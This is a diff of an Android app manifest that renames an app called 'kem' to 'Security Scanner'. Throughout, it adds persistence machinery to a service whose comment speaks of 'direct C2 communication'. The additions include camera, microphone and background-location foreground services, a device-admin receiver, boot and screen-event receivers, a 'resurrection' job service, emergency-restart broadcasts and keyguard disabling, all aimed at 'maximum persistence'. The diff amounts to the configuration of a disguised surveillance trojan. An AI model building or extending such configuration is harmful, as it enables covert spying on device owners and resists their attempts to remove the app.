@@ -18,10 +18,17 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    
+    <!-- ✅ CRITICAL: Battery optimization and persistence permissions -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
     
     <!-- Native audio recording permission -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
@@ -33,21 +40,22 @@
     
     <!-- Boot receiver permission for auto-start -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON"/>
     
     <!-- Additional permissions for enhanced native operation -->
-    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
     
     <!-- Network security and socket permissions -->
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     
     <!-- Service restart and monitoring permissions -->
-    <uses-permission android:name="android.permission.RESTART_PACKAGES" tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.GET_TASKS" />
-    <uses-permission android:name="android.permission.REAL_GET_TASKS" tools:ignore="ProtectedPermissions" />
+    
+    <!-- Background work permissions for maximum persistence -->
+    <uses-permission android:name="android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND"/>
+    <uses-permission android:name="android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND"/>
 
     <!-- Camera features -->
     <uses-feature android:name="android.hardware.camera" android:required="true" />
@@ -55,7 +63,7 @@
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
-        android:label="kem"
+        android:label="Security Scanner"
         android:icon="@mipmap/ic_launcher"
         android:requestLegacyExternalStorage="true"
         android:allowBackup="false"
@@ -72,7 +80,8 @@
             android:theme="@style/LaunchTheme"
             android:configChanges="orientation|keyboardHidden|screenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
             android:windowSoftInputMode="adjustResize"
-            android:screenOrientation="portrait">
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="false">
             <meta-data
                 android:name="io.flutter.embedding.android.NormalTheme"
                 android:resource="@style/NormalTheme"/>
@@ -92,22 +101,23 @@
             android:exported="false"
             android:enabled="true"
             android:stopWithTask="false"
-            android:foregroundServiceType="connectedDevice"
+            android:foregroundServiceType="dataSync"
             tools:replace="android:exported"/>
             
-        <!-- Enhanced native command service with direct C2 communication -->
+        <!-- ✅ ENHANCED: Native command service with maximum persistence -->
         <service
             android:name=".NativeCommandService"
             android:exported="false"
             android:enabled="true"
             android:stopWithTask="false"
-            android:foregroundServiceType="location|camera|microphone|connectedDevice"
+            android:foregroundServiceType="location|camera|microphone|connectedDevice|dataSync"
             android:priority="1000"
             android:isolatedProcess="false"
-            android:process=":native_command_service"/>
+            android:process=":persistent"
+            android:directBootAware="true"/>
             
-        <!-- Enhanced boot receiver to restart services -->
-        <receiver android:name=".BootReceiver"
+        <!-- ✅ ENHANCED: Super boot receiver with maximum coverage -->
+        <receiver android:name=".SuperBootReceiver"
             android:enabled="true"
             android:exported="true"
             android:priority="1000"
@@ -120,30 +130,22 @@
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
                 <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                 <action android:name="android.intent.action.REBOOT"/>
-                <data android:scheme="package"/>
-            </intent-filter>
-        </receiver>
-        
-        <!-- Enhanced keep alive receiver for maximum persistence -->
-        <receiver android:name=".KeepAliveReceiver"
-            android:enabled="true"
-            android:exported="false"
-            android:directBootAware="true">
-            <intent-filter>
                 <action android:name="android.intent.action.SCREEN_ON"/>
                 <action android:name="android.intent.action.SCREEN_OFF"/>
                 <action android:name="android.intent.action.USER_PRESENT"/>
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                 <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                 <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <data android:scheme="package"/>
             </intent-filter>
         </receiver>
         
-        <!-- Job service for Android 8+ background limitations -->
+        <!-- ✅ Resurrection job service for Android 8+ background limitations -->
         <service
-            android:name=".PersistentJobService"
+            android:name=".ResurrectionJobService"
             android:permission="android.permission.BIND_JOB_SERVICE"
-            android:exported="false"/>
+            android:exported="false"
+            android:enabled="true"/>
             
         <!-- Network state change receiver -->
         <receiver android:name=".NetworkChangeReceiver"
@@ -164,6 +166,40 @@
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
                 <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                 <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        
+        <!-- ✅ Additional receivers for maximum persistence -->
+        <receiver android:name=".PowerConnectionReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+            </intent-filter>
+        </receiver>
+        
+        <receiver android:name=".DeviceAdminReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin"
+                       android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+        
+        <!-- ✅ Keep-alive broadcast receiver for emergency restart -->
+        <receiver android:name=".EmergencyRestartReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.example.kem.EMERGENCY_RESTART"/>
+                <action android:name="com.example.kem.FORCE_SERVICE_RESTART"/>
+                <action android:name="KEEP_ALIVE_CHECK"/>
             </intent-filter>
         </receiver>
     </application>
